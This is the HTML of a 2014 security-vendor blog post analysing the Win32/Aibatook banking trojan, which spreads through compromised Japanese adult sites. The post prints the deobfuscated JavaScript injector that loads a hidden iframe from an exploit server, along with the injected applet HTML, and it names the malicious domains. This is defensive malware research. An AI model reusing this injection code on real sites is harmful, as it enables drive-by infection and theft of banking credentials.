<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/css/main.css?id=b3e7fe8a6c3736dca145" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Cybercrime',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });
</script>
<script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>

<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites | WeLiveSecurity</title>
<meta name="description" content="Japanese banks are facing a new bank fraud malware threat. Win32/Aibatook targets banks in Japan with an unusual technique for stealing personal information"/>
<link rel="canonical" href="https://www.welivesecurity.com/2014/07/16/win32aibatook/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites | WeLiveSecurity" />
<meta property="og:description" content="Japanese banks are facing a new bank fraud malware threat. Win32/Aibatook targets banks in Japan with an unusual technique for stealing personal information" />
<meta property="og:url" content="https://www.welivesecurity.com/2014/07/16/win32aibatook/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:tag" content="Aibatook" />
<meta property="article:tag" content="banking malware" />
<meta property="article:tag" content="Malware" />
<meta property="article:section" content="Cybercrime" />
<meta property="article:published_time" content="2014-07-16T11:41:29+00:00" />
<meta property="article:modified_time" content="2014-07-16T11:52:53+00:00" />
<meta property="og:updated_time" content="2014-07-16T11:52:53+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2014/07/tokyo-1024x570.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2014/07/tokyo-1024x570.jpg" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="570" />
<meta property="og:image:alt" content="aibatook" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Japanese banks are facing a new bank fraud malware threat. Win32/Aibatook targets banks in Japan with an unusual technique for stealing personal information" />
<meta name="twitter:title" content="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2014/07/tokyo.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">

<script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch"}]);</script>
                              <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="7R9SM-QGSYF-QDLJK-UETXR-SPM6B",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"7R9SM-QGSYF-QDLJK-UETXR-SPM6B";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="eaaqm7bfmqcrqkqce3yp4aaaabroumcm-f-1a3a1da8c-clienttons-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"32","ak.cp":"1251022","ak.ai":parseInt("757730",10),"ak.ol":"0","ak.cr":8,"ak.ipv":6,"ak.proto":"http/1.1","ak.rid":"7c206a9","ak.r":44866,"ak.a2":n,"ak.m":"","ak.n":"ff","ak.bpcip":"2001:67c:2564:518::","ak.cport":57282,"ak.gh":"92.122.101.52","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"reno","ak.t":"1659514956","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==wGIAgkWRLxLsfuru5Sv6enAPSsY5UguMoDDAU4J7+jbWGxHX9MgJGzyndvDrwYSjS2Ea9DQBPhNnbqAIz+RGTAJZlVIAizDw9TPLv9X44ODrGeDEDKZC0kiiGHKErz9JZe11QymtQVSe7XYo19gUwES/zxz2WxJoSeWxqBKwJaXxtDuFxPlpuO40Y9H4foIA4GATJPaKb8zlYGBAGScaFm6j1YIfNBLBCzogW9kBnoSZCS4KjH7MyvA34A4rQ4TxmY+13A7azid4og0CPseK3zveMrCevh4415mfMzLCUuORcMdV5LRyhKqnDyTzFgTCXmTIqsCT0izXTV+2NQ6edo6Drg221m3kfl6iiFnxxVMmFkOJ08QJBh4byrjGp6VCicffr3junhErzIcywk7FmaQ3we0zZmAL80XQW4+EPIQ=","ak.pv":"11","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="http://welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/">
                                            Ukraine Crisis – Digital Security Resource Center                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/we-live-progress/">
                                            We Live Progress                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong>					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites</h1>
<div class="excerpt">Win32/Aibatook targets Japanese bank customers with an unusual Internet Explorer monitoring technique. We believe the malware has been in development for months - and is now ready for take-off.</div>
<div class="post-meta">
    <div class="wls-authors">
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2014-07-16 11:41:29">16 Jul 2014 - 11:41AM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F&text=Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>Win32/Aibatook targets Japanese bank customers with an unusual Internet Explorer monitoring technique. We believe the malware has been in development for months &#8211; and is now ready for take-off.</p>
                            </div>

                            <h2><b>Introduction</b></h2>
<p>This blog post will explore a malware family named <a href="http://virusradar.com/en/Win32_Aibatook/detail">Win32/Aibatook</a>, which targets Japanese users&#8217; banking information and hosting providers&#8217; account credentials. It appeared at the end of 2013 and a previous version has already been documented by <a href="http://www.symantec.com/connect/blogs/financial-trojans-persistent-attacks-japanese-internet-community">Symantec</a>, which has even sinkholed some of Win32/Aibatook’s C&amp;C servers. Far from being discouraged, the operators have since published an updated version and moved from Delphi to C++ as their programming language. This post will focus on this new strain, which came out in April 2014 and has some interesting quirks:</p>
<ul>
<li>Propagation of the malware is made through a custom exploitation chain placed on compromised websites</li>
<li>It only targets Internet Explorer, using an unusual technique to steal personal information</li>
<li>Two different implementations of the information-stealing logic are deployed; the first one is specifically tailored against two major Japanese banks, whereas the second one is more flexible and currently used to target around 90 Japanese websites</li>
</ul>
<p>We will first describe the most recent propagation method of Win32/Aibatook, and then its actual functionalities and their implementation</p>
<h2><b>Propagation</b></h2>
<p>The Win32/Aibatook bank fraud malware’s story starts, <a href="/2013/07/02/the-home-campaign-overstaying-its-welcome/">as usual nowadays</a>, with legitimate websites that have been compromised to redirect their visitors to exploit-serving machines in order to infect them with malicious software. But rather than using a full-fledged exploit kit – such as Fiesta, Angler or any other of the usual suspects, which are able to serve different exploits depending on the visitor’s configuration – the miscreants behind Win32/Aibatook infections employ only one exploit at a time. While it could appear to be a non-optimal strategy, it is actually coherent with the targeted nature of this whole operation. If you possess an efficient exploit against your target – Japanese bank customers in this case – why would you bother using more?</p>
<p>Since mid-April, the exploit used to propagate Win32/Aibatook uses the Java vulnerability <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2465">CVE-2013-2465</a>. In order to do so, several compromised legitimate websites have been used. Over the last three months, we identified four of these websites (and we believe there are more) – these domain names are listed below:</p>
<p><strong>sokuhabo.net</strong><br />
<strong> www.uravidata.com</strong><br />
<strong> ppv.xxxurabi.com</strong><br />
<strong> mywife.cc</strong></p>
<p>These four websites provide pornographic content aimed at a Japanese audience. According to <a href="http://www.alexa.com/">Alexa</a>, three of them belong to the 20,000 most visited websites from Japan; “<span style="font-family: courier new,courier;">mywife.cc</span>” is even part of the first 2,000. It remains unclear how the attackers compromised these websites.</p>
<p>The image below describes the exploitation process in the particular case of &#8220;<span style="font-family: courier new,courier;">ppv.xxxurabi.com</span>&#8221; (the others three websites follow similar exploitation logic):</p>
<p><a href="/wp-content/uploads/2014/07/1_aibatook_exploit_NEW-edit-copy.png"><img class="aligncenter size-full wp-image-48026" src="/wp-content/uploads/2014/07/1_aibatook_exploit_NEW-edit-copy.png" alt="1_aibatook_exploit_NEW-edit copy" width="600" height="464" srcset="https://www.welivesecurity.com/wp-content/uploads/2014/07/1_aibatook_exploit_NEW-edit-copy.png 600w, https://www.welivesecurity.com/wp-content/uploads/2014/07/1_aibatook_exploit_NEW-edit-copy-300x232.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></a><a href="/wp-content/uploads/2014/07/1_aibatook_exploit.png"><br />
</a> <strong>1.</strong> The user browses to a webpage on &#8220;<span style="font-family: courier new,courier;">ppv.xxxurabi.com</span>&#8220;, which includes a link to a malicious JavaScript (JS) file hosted on &#8220;<span style="font-family: courier new,courier;">google.sonovi.com</span>&#8220;, another compromised website.</p>
<p><strong>2.</strong> Once a first layer of basic obfuscation has been removed, this script has the following form:</p>
<p><span style="font-family: courier new,courier;">if(document.cookie.indexOf(&#8220;GOOGLE1&#8221;)==-1)<br />
</span><span style="font-family: 'courier new', courier;">{</span> <span style="font-family: 'courier new', courier;">   </span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier;">var _d=new Date();</span> <span style="font-family: 'courier new', courier;"><br />
_d.setTime(_d.getTime()+24*60*60*1000);</span> <span style="font-family: 'courier new', courier;"><br />
document.cookie=&#8221;GOOGLE1=123GOOGLE1456;expires=&#8221;+_d.toGMTString();</span> <span style="font-family: 'courier new', courier;"><br />
setTimeout(</span> <span style="font-family: 'courier new', courier;">        </span></p>
<p style="padding-left: 60px;"><span style="font-family: 'courier new', courier;">function(){</span> <span style="font-family: 'courier new', courier;"><br />
var _ifr=document.createElement(/ifra/.source+/me/.source);</span> <span style="font-family: 'courier new', courier;"><br />
ifr.width=&#8221;1&#8243;;</span> <span style="font-family: 'courier new', courier;"><br />
ifr.height=&#8221;1&#8243;;</span> <span style="font-family: 'courier new', courier;"><br />
ifr.frameborder=&#8221;0&#8243;;</span> <span style="font-family: 'courier new', courier;"><br />
ifr.src=&#8221;//2002.jp/&#8221;;</span> <span style="font-family: 'courier new', courier;"><br />
document.body.appendChild(_ifr)},</span> <span style="font-family: 'courier new', courier;"><br />
1000)</span></p>
<p><span style="font-family: 'courier new', courier;">}</span></p>
<p>The script injects an IFRAME to an exploit-serving webpage “<span style="font-family: courier new,courier;">2002.jp</span>”. It also sets a Cookie named “<span style="font-family: courier new,courier;">GOOGLE1</span>” that will stay on the user’s computer during the next 24 hours, such that no additional redirects occur during this time-frame.</p>
<p><strong>3.</strong> Then the user connects to the exploit-serving website, which replies with what looks like an error page:</p>
<p><img class="aligncenter wp-image-47784 size-full" src="/wp-content/uploads/2014/07/2_2002_jp_cache_404.png" alt="Banking malware aibatook 1" width="562" height="449" srcset="https://www.welivesecurity.com/wp-content/uploads/2014/07/2_2002_jp_cache_404.png 562w, https://www.welivesecurity.com/wp-content/uploads/2014/07/2_2002_jp_cache_404-300x239.png 300w" sizes="(max-width: 562px) 100vw, 562px" /> Under certain conditions a snippet of HTML code – invisible to the user &#8212; will be inserted at the very beginning of the page. It is highlighted in blue in the following page source below:</p>
<p><span style="font-family: courier new,courier; color: #0000ff;">&lt;HTML&gt;<br />
&lt;BODY&gt;<br />
&lt;applet id=&#8221;HelloApplet&#8221; code=&#8221;b399.class&#8221;,height=&#8221;0&#8243; width=&#8221;0&#8243;&gt;&lt;/applet&gt;<br />
</span><span style="color: #0000ff; font-family: 'courier new', courier;">&lt;/BODY&gt;<br />
</span><span style="color: #0000ff; font-family: 'courier new', courier;">&lt;/HTML&gt;&lt;script src=&#8221;//ccc.rejec.net/counter.php&#8221;&gt;&lt;/script&gt;<br />
</span><span style="font-family: 'courier new', courier;">&lt;html&gt;</span><br />
<span style="font-family: 'courier new', courier;">&lt;head&gt;</span><br />
<span style="font-family: 'courier new', courier;">&lt;title&gt;Error 404 Not Found&lt;/title&gt;</span><br />
<span style="font-family: 'courier new', courier;">…</span></p>
<p>The browser will then download the Java applet “<span style="font-family: courier new,courier;">b399.class</span>” from the website and execute it. It will also request a file named “<span style="font-family: courier new,courier;">counter.php</span>” on another domain. We believe this last step is related to the conditions under which the HTML snippet will be inserted: only a limited number of users per day will receive the exploit, explaining the need to count the number of tries. This counter script is hosted on what appears to be yet another compromised website, “<span style="font-family: courier new,courier;">ccc.rejec.net</span>”.</p>
<p><strong>4.</strong> The Java applet is an exploit for the vulnerability CVE-2013-2465. Roughly summarized, it starts with an integer overflow in a 2D component of Java SE that leads to a memory corruption in the Abstract Window Toolkit (AWT) code. This memory corruption allows the bypass of the Java sandbox through the rewrite of the “<span style="font-family: courier new,courier;">SecurityManager</span>” class. The exploit will then download the payload from the URL provided by one of the class files, save it as “<span style="font-family: 'courier new', courier;">tar.gif</span>”, and finally execute it. The payload URL was “<span style="font-family: 'courier new', courier;">xsvx1014274.xsvr.jp</span>” during our investigation.</p>
<p>The various class files that we observed as part of this exploit are described below:</p>
<table style="border: 1px solid;">
<tbody>
<tr>
<td style="border: 1px solid; text-align: center;"><strong>SHA-1 Hash</strong></td>
<td style="border: 1px solid; text-align: center;"><strong>File Name</strong></td>
<td style="border: 1px solid; text-align: center;"><strong>Purpose</strong></td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">56ba51304da919b71833520dece8ca3c644011d3</span> <span style="font-family: 'courier new', courier;">49b0699acf7682084b4cde88a3af6d1c1b7c0c09</span></td>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">b399.class</span></td>
<td style="border: 1px solid; text-align: center;">Manages the exploitation</td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">2ca6c1a0cf118ff7beb14453da4875b59d8084e0</span></td>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">a1bd.class</span></td>
<td style="border: 1px solid; text-align: center;">Defines malicious AWT subclass</td>
</tr>
<tr>
<td style="border: 1px solid;"><span style="font-family: 'courier new', courier;">9f9627dae3adfeac8ecbd8698fc0f5da22f79d70</span></td>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">Af.class</span></td>
<td style="border: 1px solid; text-align: center;">Returns the URL of the file to download</td>
</tr>
<tr>
<td style="border: 1px solid;"><span style="font-family: 'courier new', courier;">8fb90f496367112049eb8dafb518b98945b0b9ec</span></td>
<td style="border: 1px solid; text-align: center;"><span style="font-family: 'courier new', courier;">HttpGet.class</span></td>
<td style="border: 1px solid; text-align: center;">Fetches a file at a given URL and executes it</td>
</tr>
</tbody>
</table>
<p>We would like to stress the fact that Win32/Aibatook was distributed through other exploits at different periods of time (e.g. CVE-2014-0322), but always in this “one exploit at a time” configuration according to our observations.</p>
<h2><b>Payload</b></h2>
<p>Win32/Aibatook&#8217;s main objective is to steal personal and banking information from Japanese users. This comes in two different flavors: firstly, a few banks are targeted in a tailored manner, and secondly, around 90 different websites are targeted through a more generic method. Both these methods rely on the same Internet Explorer manipulation technique, which we are now going to describe.</p>
<h3><b>Internet Explorer Manipulation</b></h3>
<p>Win32/Aibatook controls Internet Explorer through the COM interface “<a href="http://msdn.microsoft.com/en-us/library/aa752574%28v=vs.85%29.aspx">IHTMLDocument2</a>”, which allows easy reading and writing of webpages with high-level methods. To retrieve this interface for the currently browsed webpage, Win32/Aibatook performs the following steps:</p>
<ul>
<li>Retrieve a handle on the window under the mouse cursor using “<span style="font-family: courier new,courier;">GetCursorPos</span>” and “<span style="font-family: courier new,courier;">WindowFromPoint</span>” API functions</li>
<li>Check whether that window’s class name is “<span style="font-family: courier new,courier;">Internet Explorer_Server</span>”:
<ul>
<li>If it is not, the program simply sleeps for one second before retrying</li>
<li>If it is, the “<span style="font-family: courier new,courier;">IHTMLDocument2</span>” interface is instantiated from the window’s handle, using a <a href="http://support.microsoft.com/kb/249232">documented technique</a></li>
</ul>
</li>
</ul>
<p>Such Internet Explorer-specific implementations – which work from versions 8 to 11 at least – can seem pretty limited, because no other browsers can be manipulated. However, Japan is one of the few countries where <a href="http://en.wikipedia.org/wiki/Usage_share_of_web_browsers">Internet Explorer is the most-used browser</a>. This is another indicator of Win32/Aibatook&#8217;s Japanese-only focus.</p>
<p>The next two sections present the attacks used by Win32/Aibatook, respectively denoted “Tailored Information Stealer” and “Generic Information Stealer”.</p>
<h3><b>Tailored Information Stealer</b></h3>
<p>In the first application of the Internet Explorer monitoring technique, Win32/Aibatook targets a few banks whose URLs are hardcoded into the program. During our investigation, we observed Japan Post and the SBI Sumishin Net Bank as targets. In order to attack these banks, Win32/Aibatook extracts the URL of the currently visited webpage, using the “<span style="font-family: courier new,courier;">IHTMLDocument2.get_url</span>” method, and compares it with the targeted banks&#8217; URLs:</p>
<p><a href="/wp-content/uploads/2014/07/3_url_search_japanpost_NEW-edit.png"><img class="aligncenter size-full wp-image-48027" src="/wp-content/uploads/2014/07/3_url_search_japanpost_NEW-edit.png" alt="aibatook" width="600" height="689" srcset="https://www.welivesecurity.com/wp-content/uploads/2014/07/3_url_search_japanpost_NEW-edit.png 600w, https://www.welivesecurity.com/wp-content/uploads/2014/07/3_url_search_japanpost_NEW-edit-261x300.png 261w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
<p><a href="/wp-content/uploads/2014/07/3_url_search_japanpost.png"><br />
</a> It should be noted that the banks’ URLs are encrypted with a custom cipher, as are all the malicious strings present in Win32/Aibatook samples. More precisely, each encrypted string is composed of two parts:</p>
<ul>
